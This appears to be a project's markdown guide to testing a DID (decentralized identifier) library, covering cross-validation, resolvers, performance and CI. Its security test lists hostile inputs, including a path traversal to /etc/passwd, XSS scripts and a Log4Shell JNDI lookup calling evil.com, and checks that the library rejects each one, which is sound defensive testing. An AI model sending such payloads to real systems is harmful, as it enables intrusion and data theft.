# DID Testing Methods & Reference Implementations

This document outlines comprehensive testing approaches for validating DID implementations against standards and reference implementations.

## 1. **Local Reference Implementation Testing**

### Implemented

- **Cross-validation tests** (`test/cross-validation.test.ts`): Validates against W3C test vectors
- **External reference tests** (`test/external-reference.test.ts`): Tests with did-resolver library
- **Integration tests**: Full DID workflow validation

### Dependencies Available

```bash
npm install --save-dev did-resolver@^4.1.0
```

## 2. **Online DID Validators & Tools**

### W3C DID Test Suite

- **URL**: https://w3c.github.io/did-test-suite/
- **Purpose**: Official W3C test suite for DID specifications
- **Usage**: Validate your DIDs against the official test suite

### DID Universal Resolver

- **URL**: https://dev.uniresolver.io/
- **Purpose**: Universal DID resolver supporting multiple DID methods
- **Test Example**:
  ```bash
  curl -X GET "https://dev.uniresolver.io/1.0/identifiers/did:key:z6MktwupdmLXVVqTzCw4i46r4uGyosGXRnR3XjN4Zq7oMMsw"
  ```

### DID Web Resolver

- **URL**: https://did.web/
- **Purpose**: Test did:web resolution
- **Test Example**: Create a DID document at `https://example.com/.well-known/did.json`

## 3. **Reference Implementation Libraries**

### JavaScript/TypeScript

```bash
# Install for testing
npm install --save-dev @veramo/did-resolver
npm install --save-dev @ceramicnetwork/3id-did-resolver  
npm install --save-dev did-resolver-key
npm install --save-dev did-resolver-web
```

### Python

```bash
pip install did-resolver
pip install pydid
```

### Go

```bash
go get github.com/nuts-foundation/go-did
```

## 4. **Multicodec & Multibase Testing**

### Multicodec Table Validation

```typescript
// Test against official multicodec table
const MULTICODEC_EXPECTED = {
  'ed25519-pub': 0xed,    // 237
  'secp256k1-pub': 0xe7,  // 231  
  'x25519-pub': 0xec,     // 236
};
```

### Base58 Encoding Validation

```typescript
// Test against js-multiformats
npm install --save-dev multiformats
import { base58btc } from 'multiformats/bases/base58';
```

## 5. **Cross-Platform Testing**

### Node.js Version Testing

```bash
# Test across Node.js versions
nvm use 18 && npm test
nvm use 20 && npm test
nvm use 22 && npm test
```

### Browser Testing

```bash
npm install --save-dev @vitest/browser
```

## 6. **Performance & Security Testing**

### Performance Benchmarks

```typescript
// test/performance.test.ts
describe('Performance Tests', () => {
  it('should create 1000 DIDs in under 100ms', () => {
    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      createDIDKey('d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a', 'ed25519-pub');
    }
    const end = performance.now();
    expect(end - start).toBeLessThan(100);
  });
});
```

### Security Testing

```typescript
// test/security.test.ts
describe('Security Tests', () => {
  it('should handle malicious inputs safely', () => {
    const maliciousInputs = [
      '../../../etc/passwd',
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '${jndi:ldap://evil.com/a}',
      'data:text/html,<script>alert("xss")</script>'
    ];

    maliciousInputs.forEach(input => {
      expect(() => createDIDWeb(input)).toThrow();
    });
  });
});
```

## 7. **Automated Testing Scripts**

### Test Against Multiple Implementations

```bash
#!/bin/bash
# scripts/cross-validate.sh

echo "Testing against Veramo..."
npx @veramo/cli did resolve did:key:z6MktwupdmLXVVqTzCw4i46r4uGyosGXRnR3XjN4Zq7oMMsw

echo "Testing against Universal Resolver..."
curl -s "https://dev.uniresolver.io/1.0/identifiers/did:key:z6MktwupdmLXVVqTzCw4i46r4uGyosGXRnR3XjN4Zq7oMMsw" | jq .

echo "Testing did:web resolution..."
curl -s "https://did.web/did:web:example.com" | jq .
```

## 8. **Test Vector Generation**

### Generate Test Vectors

```typescript
// scripts/generate-test-vectors.ts
import { createDIDKey, createDIDWeb } from '../src/index';

const testVectors = [
  {
    name: 'Ed25519 Test Vector 1',
    input: { keyHex: 'd75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a', keyType: 'ed25519-pub' },
    expected: 'did:key:z6MktwupdmLXVVqTzCw4i46r4uGyosGXRnR3XjN4Zq7oMMsw'
  },
  // ... more vectors
];

// Export for other implementations to test against
console.log(JSON.stringify(testVectors, null, 2));
```

## 9. **Integration Testing**

### End-to-End DID Workflow

```typescript
describe('E2E DID Workflow', () => {
  it('should complete full DID lifecycle', async () => {
    // 1. Create DID
    const did = createDIDKey('d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a', 'ed25519-pub');
  
    // 2. Validate DID
    const validation = validateDID(did);
    expect(validation.isValid).toBe(true);
  
    // 3. Create DID document
    const document = createDIDDocument(did);
  
    // 4. Serialize and parse
    const serialized = JSON.stringify(document);
    const parsed = JSON.parse(serialized);
    expect(parsed.id).toBe(did);
  
    // 5. Test with external resolver
    const resolver = new Resolver({});
    const resolverResult = resolver.parse(did);
    expect(resolverResult.method).toBe('key');
  });
});
```

## 10. **Continuous Integration Testing**

### GitHub Actions

```yaml
# .github/workflows/test.yml
name: Test DID Implementation
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18, 20, 22]
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.node-version }}
      - run: npm ci
      - run: npm test
      - run: npm run test:cross-validation
      - run: npm run test:external-reference
```

## 11. **Manual Testing Commands**

### Quick Validation Commands

```bash
# Test specific DID
node -e "const {validateDID} = require('./dist'); console.log(validateDID('did:key:z6MktwupdmLXVVqTzCw4i46r4uGyosGXRnR3XjN4Zq7oMMsw'))"

# Test DID creation
node -e "const {createDIDKey} = require('./dist'); console.log(createDIDKey('d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a', 'ed25519-pub'))"

# Test against online validator
curl -X GET "https://dev.uniresolver.io/1.0/identifiers/$(node -e "console.log(require('./dist').createDIDKey('d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a', 'ed25519-pub'))")"
```

## 12. **Standards Compliance Testing**

### W3C DID Core Specification

- **ABNF Grammar**: Validate against the official ABNF grammar
- **Method-specific rules**: Ensure method-specific identifiers are valid
- **DID URL syntax**: Test fragments, queries, and paths

### DID Key Method Specification

- **Multicodec encoding**: Validate proper varint encoding
- **Base58 encoding**: Ensure proper Base58BTC encoding
- **Key type support**: Test all supported key types

### DID Web Method Specification

- **Domain validation**: Ensure proper domain format
- **Path encoding**: Test path component encoding
- **HTTPS requirements**: Validate security requirements

## Running All Tests

```bash
# Run all tests
npm test

# Run specific test suites
npm test -- cross-validation
npm test -- external-reference
npm test -- integration

# Run with coverage
npm run test:coverage

# Run performance tests
npm run test:performance
```

This comprehensive testing approach ensures your DID implementation is robust, standards-compliant, and compatible with the broader DID ecosystem.
